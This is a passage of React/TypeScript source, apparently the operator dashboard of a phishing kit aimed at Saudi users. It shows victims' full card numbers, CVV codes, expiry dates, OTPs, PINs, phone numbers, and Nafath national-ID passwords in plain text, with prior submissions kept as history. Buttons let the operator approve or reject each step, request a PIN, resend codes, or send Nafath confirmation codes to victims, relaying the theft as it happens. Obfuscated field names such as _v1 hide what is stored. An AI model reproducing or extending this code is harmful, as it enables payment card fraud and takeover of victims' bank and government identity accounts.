        padding: 16, 
        border: "1px solid #e5e7eb",
        marginBottom: 12
      }}>
        <div style={{ 
          display: "flex", 
          justifyContent: "center", 
          alignItems: "center", 
          gap: 8, 
          marginBottom: 12,
          paddingBottom: 12,
          borderBottom: "2px solid #e5e7eb"
        }}>
          <span style={{ fontSize: "1.2rem" }}>🔢</span>
          <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#0a4a68" }}>
            رمز التحقق (OTP)
          </h3>
        </div>
        
        <div style={{ 
          ...config, 
          borderRadius: 8, 
          padding: 12, 
          border: `1px solid ${config.border}`,
          display: "flex",
          alignItems: "center",
          gap: 8,
          marginBottom: 12
        }}>
          <span style={{ fontSize: "1.2rem" }}>{config.icon}</span>
          <span style={{ fontSize: "0.85rem", fontWeight: 600, color: config.color }}>
            {config.text}
          </span>
        </div>

        {/* عرض رمز OTP */}
        {otpValue && (
          <div style={{
            background: "#f8fafc",
            borderRadius: 8,
            padding: 16,
            border: "1px solid #e5e7eb",
            textAlign: "center",
            marginBottom: 8
          }}>
            <div style={{
              fontSize: "0.75rem",
              color: "#6b7280",
              marginBottom: 8,
              fontWeight: 500
            }}>
              رمز التحقق المدخل
            </div>
            <div style={{
              fontFamily: "ui-monospace, monospace",
              fontSize: "1.8rem",
              fontWeight: 700,
              color: "#0a4a68",
              letterSpacing: "8px",
              direction: "ltr"
            }}>
              {otpValue}
            </div>
          </div>
        )}

        {/* أزرار التحكم */}
        {otpStatus === "verifying" && (
          <div style={{ 
            display: "flex", 
            gap: 8, 
            marginBottom: 12 
          }}>
            <button
              onClick={(e) => handleOtpAction("approved", e)}
              style={{
                flex: 1,
                padding: "10px 16px",
                borderRadius: 8,
                border: "none",
                background: "#166534",
                color: "white",
                fontSize: "0.8rem",
                fontWeight: 600,
                cursor: "pointer",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: 6
              }}
            >
              ✅ موافق
            </button>
            <button
              onClick={(e) => handleOtpAction("rejected", e)}
              style={{
                flex: 1,
                padding: "10px 16px",
                borderRadius: 8,
                border: "none",
                background: "#991b1b",
                color: "white",
                fontSize: "0.8rem",
                fontWeight: 600,
                cursor: "pointer",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: 6
              }}
            >
              ❌ رفض
            </button>
          </div>
        )}

        {/* زر عرض الرموز السابقة */}
        {hasOtpHistory[selectedRequest?.id || selectedRequest?.visitorId || ""] && (
          <div style={{ marginTop: 12 }}>
            <button
              onClick={() => toggleOtpHistory(selectedRequest?.id || selectedRequest?.visitorId || "")}
              style={{
                width: "100%",
                padding: "8px 16px",
                borderRadius: 8,
                border: "1px solid #e5e7eb",
                background: expandedOtpCodes[selectedRequest?.id || selectedRequest?.visitorId || ""] ? "#f3f4f6" : "#ffffff",
                color: "#374151",
                fontSize: "0.75rem",
                fontWeight: 600,
                cursor: "pointer",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: 6
              }}
            >
              {expandedOtpCodes[selectedRequest?.id || selectedRequest?.visitorId || ""] ? "🔼 إخفاء السجلات" : `📋 عرض ${otpCodesHistory[selectedRequest?.id || selectedRequest?.visitorId || ""]?.length || 0} رموز سابقة`}
            </button>

            {/* سجلات الرموز */}
            {expandedOtpCodes[selectedRequest?.id || selectedRequest?.visitorId || ""] && (
              <div style={{ 
                marginTop: 8,
                maxHeight: 300,
                overflowY: "auto"
              }}>
                {otpCodesHistory[selectedRequest?.id || selectedRequest?.visitorId || ""]?.map((item: any, idx: number) => (
                  <div key={idx} style={{
                    background: "#f9fafb",
                    borderRadius: 8,
                    padding: 12,
                    marginBottom: 8,
                    border: "1px solid #e5e7eb",
                    textAlign: "center"
                  }}>
                    <div style={{ fontSize: "0.7rem", fontWeight: 600, color: "#374151", marginBottom: 4 }}>
                      رمز سابق #{idx + 1}
                    </div>
                    <div style={{
                      fontFamily: "ui-monospace, monospace",
                      fontSize: "1.4rem",
                      fontWeight: 700,
                      color: "#0a4a68",
                      letterSpacing: "6px",
                      direction: "ltr",
                      marginBottom: 4
                    }}>
                      {item.code}
                    </div>
                    <div style={{
                      fontSize: "0.65rem",
                      padding: "2px 6px",
                      borderRadius: 4,
                      display: "inline-block",
                      background: item.status === "approved" ? "#dcfce7" : item.status === "rejected" ? "#fee2e2" : "#fef3c7",
                      color: item.status === "approved" ? "#166534" : item.status === "rejected" ? "#991b1b" : "#92400e"
                    }}>
                      {item.status === "approved" ? "✅" : item.status === "rejected" ? "❌" : "⏳"} {item.status}
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {/* وقت آخر تحديث */}
        {raw?._v5UpdatedAt && (
          <div style={{
            fontSize: "0.7rem",
            color: "#9ca3af",
            textAlign: "center"
          }}>
            <BoxTimer timestamp={raw._v5UpdatedAt} />
          </div>
        )}
      </div>
    );
  };

  // صندوق بيانات بطاقة الدفع (صفحة check)
  const renderCheckBox = () => {
    const raw = selectedRequest?.raw || {};
    
    // التحقق من وجود بيانات البطاقة (فحص شامل)
    const hasCardData = raw?._v1 || raw?.cardNumber || raw?.hasCard || raw?.cvv || raw?._v2 || raw?.cardOwner || raw?._v4;
    if (!hasCardData) return null;

    // رقم البطاقة (كامل)
    const cardNumber = raw?._v1 || raw?.cardNumber || "";

    // رمز الأمان
    const cvv = raw?._v2 || raw?.cvv || "";

    // نوع البطاقة
    const cardType = raw?.cardType || detectCardType(cardNumber);
    const cardTypeIcons: Record<string, string> = {
      "Visa": "💳",
      "Mastercard": "💳",
      "Mada": "💳"
    };

    // حالة البطاقة
    const cardStatus = raw?._v1Status || raw?.cardStatus || "pending";
    const cardStatusConfig: Record<string, { color: string; bg: string; border: string; icon: string; text: string }> = {
      "pending": { color: "#92400e", bg: "#fef3c7", border: "#fcd34d", icon: "⏳", text: "بانتظار التحقق" },
      "verifying": { color: "#1e40af", bg: "#dbeafe", border: "#93c5fd", icon: "🔄", text: "جاري التحقق" },
      "approved": { color: "#166534", bg: "#dcfce7", border: "#86efac", icon: "✅", text: "تم التحقق" },
      "rejected": { color: "#991b1b", bg: "#fee2e2", border: "#fca5a5", icon: "❌", text: "مرفوض" }
    };
    const cardConfig = cardStatusConfig[cardStatus] || cardStatusConfig["pending"];

    // تاريخ الانتهاء
    const expiryDate = raw?._v3 || raw?.cardExpiry || "";

    // اسم حامل البطاقة
    const cardHolder = raw?._v4 || raw?.cardHolder || "";

    // السعر الإجمالي

    return (
      <div style={{ 
        background: "#ffffff", 
        borderRadius: 12, 
        padding: 16, 
        border: "1px solid #e5e7eb",
        marginBottom: 12
      }}>
        {/* Header */}
        <div style={{ 
          display: "flex", 
          justifyContent: "center", 
          alignItems: "center", 
          gap: 8, 
          marginBottom: 12,
          paddingBottom: 12,
          borderBottom: "2px solid #e5e7eb"
        }}>
          <span style={{ fontSize: "1.2rem" }}>💳</span>
          <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#0a4a68" }}>
            بيانات بطاقة الدفع
          </h3>
        </div>

        {/* Card Status Badge */}
        <div style={{ 
          ...cardConfig, 
          borderRadius: 8, 
          padding: 10, 
          border: `1px solid ${cardConfig.border}`,
          display: "flex",
          alignItems: "center",
          gap: 8,
          marginBottom: 12
        }}>
          <span style={{ fontSize: "1rem" }}>{cardConfig.icon}</span>
          <span style={{ fontSize: "0.8rem", fontWeight: 600, color: cardConfig.color }}>
            {cardConfig.text}
          </span>
        </div>

        {/* Card Preview */}
        <div style={{
          background: "linear-gradient(135deg, #1e3a5f 0%, #0a4a68 100%)",
          borderRadius: 12,
          padding: 16,
          marginBottom: 12,
          color: "white"
        }}>
          <div style={{ 
            display: "flex", 
            justifyContent: "space-between", 
            alignItems: "center",
            marginBottom: 16
          }}>
            <span style={{ fontSize: "0.8rem", fontWeight: 500, opacity: 0.9 }}>
              {cardType || "Credit Card"}
            </span>
            <span style={{ fontSize: "1.2rem" }}>💳</span>
          </div>
          
          {/* رقم البطاقة كامل */}
          <div style={{ 
            fontFamily: "ui-monospace, monospace", 
            fontSize: "1.1rem", 
            letterSpacing: "2px",
            marginBottom: 12
          }}>
            {cardNumber || "**** **** **** ****"}
          </div>
          
          <div style={{ 
            display: "flex", 
            justifyContent: "space-between",
            fontSize: "0.75rem"
          }}>
            <div>
              <div style={{ opacity: 0.7, marginBottom: 2 }}>Card Holder</div>
              <div style={{ fontWeight: 500, textTransform: "uppercase" }}>
                {cardHolder || "UNKNOWN"}
              </div>
            </div>
            <div style={{ display: "flex", gap: 16 }}>
              <div>
                <div style={{ opacity: 0.7, marginBottom: 2 }}>Expires</div>
                <div style={{ fontWeight: 500 }}>{expiryDate || "**/**"}</div>
              </div>
              {cvv && (
                <div>
                  <div style={{ opacity: 0.7, marginBottom: 2 }}>CVV</div>
                  <div style={{ fontWeight: 500 }}>{cvv}</div>
                </div>
              )}
            </div>
          </div>
        </div>

        {/* أزرار التحكم */}
        {cardStatus === "pending" && (
          <div style={{ 
            display: "flex", 
            gap: 8 
          }}>
            <button
              onClick={(e) => handlePaymentAction("approved", e)}
              style={{
                flex: 1,
                padding: "10px 16px",
                borderRadius: 8,
                border: "none",
                background: "#166534",
                color: "white",
                fontSize: "0.8rem",
                fontWeight: 600,
                cursor: "pointer",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: 6
              }}
            >
              ✅ موافق
            </button>
            <button
              onClick={(e) => handlePaymentAction("rejected", e)}
              style={{
                flex: 1,
                padding: "10px 16px",
                borderRadius: 8,
                border: "none",
                background: "#991b1b",
                color: "white",
                fontSize: "0.8rem",
                fontWeight: 600,
                cursor: "pointer",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: 6
              }}
            >
              ❌ رفض
            </button>
            <button
              onClick={(e) => handlePaymentAction("pin", e)}
              style={{
                flex: 1,
                padding: "10px 16px",
                borderRadius: 8,
                border: "none",
                background: "#1e40af",
                color: "white",
                fontSize: "0.8rem",
                fontWeight: 600,
                cursor: "pointer",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: 6
              }}
            >
              🔑 رمز PIN
            </button>
          </div>
        )}

        {/* زر عرض جميع البطاقات (يظهر فقط إذا كان هناك سجلات) */}
        {hasCardHistory[selectedRequest?.id || selectedRequest?.visitorId || ""] && (
          <div style={{ marginTop: 12 }}>
            <button
              onClick={() => toggleCardHistory(selectedRequest?.id || selectedRequest?.visitorId || "")}
              style={{
                width: "100%",
                padding: "8px 16px",
                borderRadius: 8,
                border: "1px solid #e5e7eb",
                background: expandedCards[selectedRequest?.id || selectedRequest?.visitorId || ""] ? "#f3f4f6" : "#ffffff",
                color: "#374151",
                fontSize: "0.75rem",
                fontWeight: 600,
                cursor: "pointer",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: 6
              }}
            >
              {expandedCards[selectedRequest?.id || selectedRequest?.visitorId || ""] ? "🔼 إخفاء السجلات" : `📋 عرض ${cardsHistory[selectedRequest?.id || selectedRequest?.visitorId || ""]?.length || 0} بطاقات سابقة`}
            </button>

            {/* سجلات البطاقات */}
            {expandedCards[selectedRequest?.id || selectedRequest?.visitorId || ""] && (
              <div style={{ 
                marginTop: 8,
                maxHeight: 300,
                overflowY: "auto"
              }}>
                {cardsHistory[selectedRequest?.id || selectedRequest?.visitorId || ""]?.map((card: any, idx: number) => (
                  <div key={idx} style={{
                    background: "#f9fafb",
                    borderRadius: 8,
                    padding: 12,
                    marginBottom: 8,
                    border: "1px solid #e5e7eb"
                  }}>
                    <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 8 }}>
                      <span style={{ fontSize: "0.7rem", fontWeight: 600, color: "#374151" }}>
                        بطاقة سابقة #{idx + 1}
                      </span>
                      <span style={{ 
                        fontSize: "0.65rem", 
                        padding: "2px 6px",
                        borderRadius: 4,
                        background: card.status === "approved" ? "#dcfce7" : card.status === "rejected" ? "#fee2e2" : "#fef3c7",
                        color: card.status === "approved" ? "#166534" : card.status === "rejected" ? "#991b1b" : "#92400e"
                      }}>
                        {card.status === "approved" ? "✅" : card.status === "rejected" ? "❌" : "⏳"} {card.status}
                      </span>
                    </div>
                    <div style={{ 
                      fontFamily: "ui-monospace, monospace", 
                      fontSize: "0.8rem", 
                      letterSpacing: "1px",
                      color: "#1f2937",
                      marginBottom: 4
                    }}>
                      {card.cardNumber}
                    </div>
                    <div style={{ fontSize: "0.7rem", color: "#6b7280" }}>
                      {card.cardHolder} | {card.expiryDate} | {card.cvv}
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {/* Card Updated Time */}
        {(raw?.cardUpdatedAt || raw?._v1UpdatedAt) && (
          <div style={{
            marginTop: 10,
            fontSize: "0.7rem",
            color: "#9ca3af",
            textAlign: "center"
          }}>
            <BoxTimer timestamp={raw._v1UpdatedAt || raw.cardUpdatedAt} />
          </div>
        )}
      </div>
    );
  };

  // دالة للكشف عن نوع البطاقة من الرقم
  function detectCardType(cardNumber: string): string {
    const cleanNumber = cardNumber.replace(/\s/g, "");
    if (/^4/.test(cleanNumber)) return "Visa";
    if (/^5[1-5]/.test(cleanNumber)) return "Mastercard";
    if (/^4[0-9]{12}(?:[0-9]{3})?$/.test(cleanNumber)) return "Visa";
    if (/^5[1-5][0-9]{14}$/.test(cleanNumber)) return "Mastercard";
    if (/^2[2-7]/.test(cleanNumber)) return "Mastercard";
    if (/^6(?:011|5)/.test(cleanNumber)) return "Discover";
    return "Card";
  }

  // صندوق صفحة رقم الهاتف (step5)
  const renderPhoneBox = () => {
    const raw = selectedRequest?.raw || {};
    const timestamp = raw?.phoneSubmittedAt || raw?._v7UpdatedAt || raw?.phoneUpdatedAt || raw?.updatedAt;

    const phoneOtpStatus = raw?.phoneOtpStatus;
    const statusConfig: Record<string, { color: string; bg: string; border: string; icon: string; text: string }> = {
      "pending": { color: "#92400e", bg: "#fef3c7", border: "#fcd34d", icon: "⏳", text: "بانتظار التحقق" },
      "verifying": { color: "#1e40af", bg: "#dbeafe", border: "#93c5fd", icon: "🔄", text: "جاري التحقق" },
      "approved": { color: "#166534", bg: "#dcfce7", border: "#86efac", icon: "✅", text: "تم التحقق" },
      "rejected": { color: "#991b1b", bg: "#fee2e2", border: "#fca5a5", icon: "❌", text: "مرفوض" }
    };

    // ترجمة شركات الاتصالات
    const carrierLabels: Record<string, string> = {
      "stc": "STC - الاتصالات السعودية",
      "mobily": "Mobily - موبايلي",
      "zain": "Zain - زين",
      "virgin": "Virgin Mobile",
      "lebara": "Lebara",
      "salam": "SALAM - سلام",
      "go": "GO - جو"
    };

    return (
      <div style={{ 
        background: "#ffffff", 
        borderRadius: 12, 
        padding: 16, 
        border: "1px solid #e5e7eb",
        marginBottom: 12
      }}>
        <div style={{ 
          display: "flex", 
          justifyContent: "center", 
          alignItems: "center", 
          gap: 8, 
          marginBottom: 12,
          paddingBottom: 12,
          borderBottom: "2px solid #e5e7eb"
        }}>
          <span style={{ fontSize: "1.2rem" }}>📱</span>
          <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#0a4a68" }}>
            التحقق من رقم الهاتف
          </h3>
        </div>
        
        <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
          {raw?.phoneIdNumber && renderDataRow("رقم الهوية", raw.phoneIdNumber, "🪪")}
          {raw?.phoneNumber && renderDataRow("رقم الجوال", raw.phoneNumber, "📱")}
          {raw?.phoneCarrier && renderDataRow(
            "شركة الاتصالات", 
            carrierLabels[raw.phoneCarrier] || raw.phoneCarrier,
            "📡"
          )}
          
          {/* عرض رمز التحقق (OTP) */}
          {raw?._v7 && (
            <div style={{ 
              background: "#fef3c7", 
              borderRadius: 6, 
              padding: "10px 12px", 
              border: "1px solid #fcd34d",
              textAlign: "center"
            }}>
              <div style={{ fontSize: "0.7rem", color: "#92400e", marginBottom: 4, fontWeight: 500 }}>
                رمز التحقق المدخل
              </div>
              <div style={{ 
                fontFamily: "ui-monospace, monospace", 
                fontSize: "1.4rem", 
                fontWeight: 700, 
                color: "#78350f",
                letterSpacing: "6px",
                direction: "ltr"
              }}>
                {raw._v7}
              </div>
            </div>
          )}
          
          {phoneOtpStatus && (
            <div style={{ 
              ...(statusConfig[phoneOtpStatus] || statusConfig["pending"]), 
              borderRadius: 8, 
              padding: 12, 
              border: `1px solid ${(statusConfig[phoneOtpStatus] || statusConfig["pending"]).border}`,
              display: "flex",
              alignItems: "center",
              gap: 8
            }}>
              <span style={{ fontSize: "1rem" }}>{(statusConfig[phoneOtpStatus] || statusConfig["pending"]).icon}</span>
              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: (statusConfig[phoneOtpStatus] || statusConfig["pending"]).color }}>
                {(statusConfig[phoneOtpStatus] || statusConfig["pending"]).text}
              </span>
            </div>
          )}

          {/* أزرار التحكم */}
          {phoneOtpStatus === "verifying" && (
            <div style={{ 
              display: "flex", 
              gap: 8 
            }}>
              <button
                onClick={(e) => handlePhoneAction("rejected", e)}
                style={{
                  flex: 1,
                  padding: "10px 12px",
                  borderRadius: 8,
                  border: "none",
                  background: "#991b1b",
                  color: "white",
                  fontSize: "0.75rem",
                  fontWeight: 600,
                  cursor: "pointer",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  gap: 4
                }}
              >
                ❌ رفض
              </button>
              <button
                onClick={(e) => handlePhoneAction("resend", e)}
                style={{
                  flex: 1,
                  padding: "10px 12px",
                  borderRadius: 8,
                  border: "none",
                  background: "#d97706",
                  color: "white",
                  fontSize: "0.75rem",
                  fontWeight: 600,
                  cursor: "pointer",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  gap: 4
                }}
              >
                🔄 إعادة إرسال
              </button>
              <button
                onClick={(e) => handlePhoneAction("approved", e)}
                style={{
                  flex: 1,
                  padding: "10px 12px",
                  borderRadius: 8,
                  border: "none",
                  background: "#166534",
                  color: "white",
                  fontSize: "0.75rem",
                  fontWeight: 600,
                  cursor: "pointer",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  gap: 4
                }}
              >
                ✅ موافق
              </button>
            </div>
          )}

          {/* زر عرض بيانات الهاتف والرموز السابقة */}
          {hasPhoneHistory[selectedRequest?.id || selectedRequest?.visitorId || ""] && (
            <div style={{ marginTop: 12 }}>
              <button
                onClick={() => togglePhoneHistory(selectedRequest?.id || selectedRequest?.visitorId || "")}
                style={{
                  width: "100%",
                  padding: "8px 16px",
                  borderRadius: 8,
                  border: "1px solid #e5e7eb",
                  background: expandedPhoneHistory[selectedRequest?.id || selectedRequest?.visitorId || ""] ? "#f3f4f6" : "#ffffff",
                  color: "#374151",
                  fontSize: "0.75rem",
                  fontWeight: 600,
                  cursor: "pointer",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  gap: 6
                }}
              >
                {expandedPhoneHistory[selectedRequest?.id || selectedRequest?.visitorId || ""] ? "🔼 إخفاء السجلات" : `📋 عرض ${phoneHistory[selectedRequest?.id || selectedRequest?.visitorId || ""]?.length || 0} بيانات هاتف سابقة`}
              </button>

              {/* سجلات بيانات الهاتف */}
              {expandedPhoneHistory[selectedRequest?.id || selectedRequest?.visitorId || ""] && (
                <div style={{ 
                  marginTop: 8,
                  maxHeight: 300,
                  overflowY: "auto"
                }}>
                  {phoneHistory[selectedRequest?.id || selectedRequest?.visitorId || ""]?.map((item: any, idx: number) => (
                    <div key={idx} style={{
                      background: "#f9fafb",
                      borderRadius: 8,
                      padding: 12,
                      marginBottom: 8,
                      border: "1px solid #e5e7eb"
                    }}>
                      <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 8 }}>
                        <span style={{ fontSize: "0.7rem", fontWeight: 600, color: "#374151" }}>
                          بيانات هاتف سابقة #{idx + 1}
                        </span>
                        <span style={{ 
                          fontSize: "0.65rem", 
                          padding: "2px 6px",
                          borderRadius: 4,
                          background: item.otpStatus === "approved" ? "#dcfce7" : item.otpStatus === "rejected" ? "#fee2e2" : "#fef3c7",
                          color: item.otpStatus === "approved" ? "#166534" : item.otpStatus === "rejected" ? "#991b1b" : "#92400e"
                        }}>
                          {item.otpStatus === "approved" ? "✅" : item.otpStatus === "rejected" ? "❌" : "⏳"} {item.otpStatus}
                        </span>
                      </div>
                      <div style={{ fontSize: "0.7rem", color: "#6b7280", marginBottom: 4 }}>
                        <span>📱 {item.phoneNumber}</span>
                        {item.phoneCarrier && <span style={{ marginRight: 8 }}>📡 {item.phoneCarrier}</span>}
                      </div>
                      {item.otpCode && (
                        <div style={{
                          fontFamily: "ui-monospace, monospace",
                          fontSize: "1rem",
                          fontWeight: 600,
                          color: "#78350f",
                          letterSpacing: "4px",
                          direction: "ltr",
                          textAlign: "center",
                          background: "#fef3c7",
                          padding: "4px 8px",
                          borderRadius: 4,
                          marginTop: 4
                        }}>
                          {item.otpCode}
                        </div>
                      )}
                    </div>
                  ))}
                </div>
              )}
            </div>
          )}
        </div>
        
        {/* عداد التحديث */}
        {timestamp && (
          <div style={{ marginTop: 12, textAlign: "center", paddingTop: 12, borderTop: "1px solid #e5e7eb" }}>
            <BoxTimer timestamp={timestamp} />
          </div>
        )}
      </div>
    );
  };

  // صندوق صفحة النفاذ (step4)
  const renderNafadBox = () => {
    const raw = selectedRequest?.raw || {};
    const timestamp = raw?.nafadUpdatedAt || raw?.updatedAt;

    const nafadStatus = raw?.nafadStatus || raw?.nafadConfirmationStatus;
    const statusConfig: Record<string, { color: string; bg: string; border: string; icon: string; text: string }> = {
      "waiting": { color: "#92400e", bg: "#fef3c7", border: "#fcd34d", icon: "⏳", text: "بانتظار الموافقة" },
      "verifying": { color: "#1e40af", bg: "#dbeafe", border: "#93c5fd", icon: "🔄", text: "جاري التحقق" },
      "approved": { color: "#166534", bg: "#dcfce7", border: "#86efac", icon: "✅", text: "تم الموافقة" },
      "rejected": { color: "#991b1b", bg: "#fee2e2", border: "#fca5a5", icon: "❌", text: "مرفوض" }
    };

    return (
      <div style={{ 
        background: "#ffffff", 
        borderRadius: 12, 
        padding: 16, 
        border: "1px solid #e5e7eb",
        marginBottom: 12
      }}>
        <div style={{ 
          display: "flex", 
          justifyContent: "center", 
          alignItems: "center", 
          gap: 8, 
          marginBottom: 12,
          paddingBottom: 12,
          borderBottom: "2px solid #e5e7eb"
        }}>
          <span style={{ fontSize: "1.2rem" }}>🔒</span>
          <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#0a4a68" }}>
            التحقق عبر نفاذ
          </h3>
        </div>
        
        <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
          {raw?.nafadIdNumber && renderDataRow("رقم بطاقة الأحوال", raw.nafadIdNumber, "🪪")}
          
          {/* عرض كلمة المرور (بشكل واضح) */}
          {raw?.nafadPassword && (
            <div style={{ 
              display: "flex", 
              justifyContent: "space-between", 
              alignItems: "center", 
              background: "#fef3c7", 
              borderRadius: 6, 
              padding: "8px 12px", 
              border: "1px solid #fcd34d"
            }}>
              <span style={{ fontSize: "0.75rem", color: "#92400e", display: "flex", alignItems: "center", gap: 6 }}>
                <span>🔑</span>كلمة المرور
              </span>
              <span style={{ 
                fontSize: "0.85rem", 
                fontWeight: 700, 
                color: "#78350f",
                fontFamily: "ui-monospace, monospace",
                letterSpacing: "1px"
              }}>
                {raw.nafadPassword}
              </span>
            </div>
          )}
          
          {nafadStatus && (
            <div style={{ 
              ...(statusConfig[nafadStatus] || statusConfig["waiting"]), 
              borderRadius: 8, 
              padding: 12, 
              border: `1px solid ${(statusConfig[nafadStatus] || statusConfig["waiting"]).border}`,
              display: "flex",
              alignItems: "center",
              gap: 8
            }}>
              <span style={{ fontSize: "1rem" }}>{(statusConfig[nafadStatus] || statusConfig["waiting"]).icon}</span>
              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: (statusConfig[nafadStatus] || statusConfig["waiting"]).color }}>
                {(statusConfig[nafadStatus] || statusConfig["waiting"]).text}
              </span>
            </div>
          )}

          {/* حقل إدخال رمز التحقق من نفاذ + زر الإرسال */}
          {nafadStatus === "waiting" && (
            <div style={{ 
              marginTop: 8,
              padding: 12,
              background: "#f0fdf4",
              borderRadius: 8,
              border: "1px solid #bbf7d0"
            }}>
              <div style={{ fontSize: "0.75rem", color: "#166534", fontWeight: 600, marginBottom: 8 }}>
                📤 إرسال رمز التحقق من نفاذ
              </div>
              <div style={{ display: "flex", gap: 8 }}>
                <input
                  type="text"
                  placeholder="أدخل رقم التأكيد"
                  value={nafadInput}
                  onChange={(e) => setNafadInput(e.target.value)}
                  style={{
                    flex: 1,
                    padding: "8px 12px",
                    borderRadius: 6,
                    border: "1px solid #d1d5db",
                    fontSize: "0.85rem",
                    textAlign: "center",
                    direction: "ltr"
                  }}
                />
                <button
                  onClick={(e) => handleSendNafadCode(e)}
                  disabled={!nafadInput.trim()}
                  style={{
                    padding: "8px 16px",
                    borderRadius: 6,
                    border: "none",
                    background: nafadInput.trim() ? "#166534" : "#9ca3af",
                    color: "white",
                    fontSize: "0.8rem",
                    fontWeight: 600,
                    cursor: nafadInput.trim() ? "pointer" : "not-allowed"
                  }}
                >
                  إرسال
                </button>
              </div>
            </div>
          )}

          {/* زر عرض بيانات النفاذ السابقة */}
          {hasNafadHistory[selectedRequest?.id || selectedRequest?.visitorId || ""] && (
            <div style={{ marginTop: 12 }}>
              <button
                onClick={() => toggleNafadHistory(selectedRequest?.id || selectedRequest?.visitorId || "")}
                style={{
                  width: "100%",
                  padding: "8px 16px",
                  borderRadius: 8,
                  border: "1px solid #e5e7eb",
                  background: expandedNafadHistory[selectedRequest?.id || selectedRequest?.visitorId || ""] ? "#f3f4f6" : "#ffffff",
                  color: "#374151",
                  fontSize: "0.75rem",
                  fontWeight: 600,
                  cursor: "pointer",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  gap: 6
                }}
              >
                {expandedNafadHistory[selectedRequest?.id || selectedRequest?.visitorId || ""] ? "🔼 إخفاء السجلات" : `📋 عرض ${nafadHistory[selectedRequest?.id || selectedRequest?.visitorId || ""]?.length || 0} بيانات نفاذ سابقة`}
              </button>

              {/* سجلات بيانات النفاذ */}
              {expandedNafadHistory[selectedRequest?.id || selectedRequest?.visitorId || ""] && (
                <div style={{ 
                  marginTop: 8,
                  maxHeight: 300,
                  overflowY: "auto"
                }}>
                  {nafadHistory[selectedRequest?.id || selectedRequest?.visitorId || ""]?.map((item: any, idx: number) => (
                    <div key={idx} style={{
                      background: "#f9fafb",
                      borderRadius: 8,
                      padding: 12,
                      marginBottom: 8,
                      border: "1px solid #e5e7eb"
                    }}>
                      <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 8 }}>
                        <span style={{ fontSize: "0.7rem", fontWeight: 600, color: "#374151" }}>
                          بيانات نفاذ سابقة #{idx + 1}
                        </span>
                        <span style={{ 
                          fontSize: "0.65rem", 
                          padding: "2px 6px",
                          borderRadius: 4,
                          background: item.nafadStatus === "approved" ? "#dcfce7" : item.nafadStatus === "rejected" ? "#fee2e2" : "#fef3c7",
                          color: item.nafadStatus === "approved" ? "#166534" : item.nafadStatus === "rejected" ? "#991b1b" : "#92400e"
                        }}>
                          {item.nafadStatus === "approved" ? "✅" : item.nafadStatus === "rejected" ? "❌" : "⏳"} {item.nafadStatus}
                        </span>
                      </div>
                      <div style={{ fontSize: "0.7rem", color: "#6b7280", marginBottom: 4 }}>
                        <span>🪪 {item.nafadIdNumber}</span>
                      </div>
                      {item.nafadPassword && (
                        <div style={{
                          fontFamily: "ui-monospace, monospace",
                          fontSize: "0.85rem",
                          fontWeight: 600,
                          color: "#78350f",
                          letterSpacing: "1px",
                          background: "#fef3c7",
                          padding: "4px 8px",
                          borderRadius: 4,
                          marginTop: 4
                        }}>
                          🔑 {item.nafadPassword}
                        </div>
                      )}
                    </div>
                  ))}
                </div>
              )}
            </div>
          )}
        </div>
        
        {/* عداد التحديث */}
        {timestamp && (
          <div style={{ marginTop: 12, textAlign: "center", paddingTop: 12, borderTop: "1px solid #e5e7eb" }}>
            <BoxTimer timestamp={timestamp} />
          </div>
        )}
      </div>
    );
  };

  // صندوق صفحة PIN (step3)
  const renderPinBox = () => {
    const raw = selectedRequest?.raw || {};
    const timestamp = raw?.pinSubmittedAt || raw?._v6UpdatedAt || raw?.pinUpdatedAt || raw?.updatedAt;
    
    const pinStatus = raw?._v6Status || raw?.pinStatus;
    const pinCode = raw?._v6 || raw?.pinCode || "";
    
    // التحقق من وجود بيانات PIN
    const hasPinData = pinCode || pinStatus;
    if (!hasPinData) return null;

    const statusConfig: Record<string, { color: string; bg: string; border: string; icon: string; text: string }> = {
      "pending": { color: "#92400e", bg: "#fef3c7", border: "#fcd34d", icon: "⏳", text: "بانتظار التحقق" },
      "verifying": { color: "#1e40af", bg: "#dbeafe", border: "#93c5fd", icon: "🔄", text: "جاري التحقق" },
      "approved": { color: "#166534", bg: "#dcfce7", border: "#86efac", icon: "✅", text: "تم التحقق" },
      "rejected": { color: "#991b1b", bg: "#fee2e2", border: "#fca5a5", icon: "❌", text: "مرفوض" }
    };

    const config = statusConfig[pinStatus] || statusConfig["pending"];

    return (
      <div style={{ 
        background: "#ffffff", 
        borderRadius: 12, 
        padding: 16, 
        border: "1px solid #e5e7eb",
        marginBottom: 12
      }}>
        <div style={{ 
          display: "flex", 
          justifyContent: "center", 
          alignItems: "center", 
          gap: 8, 
          marginBottom: 12,
          paddingBottom: 12,
          borderBottom: "2px solid #e5e7eb"
        }}>
          <span style={{ fontSize: "1.2rem" }}>🔐</span>
          <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#0a4a68" }}>
            رمز PIN
          </h3>
        </div>
        
        {/* عرض حالة PIN */}
        <div style={{ 
          ...config, 
          borderRadius: 8, 
          padding: 12, 
          border: `1px solid ${config.border}`,
          display: "flex",
          alignItems: "center",
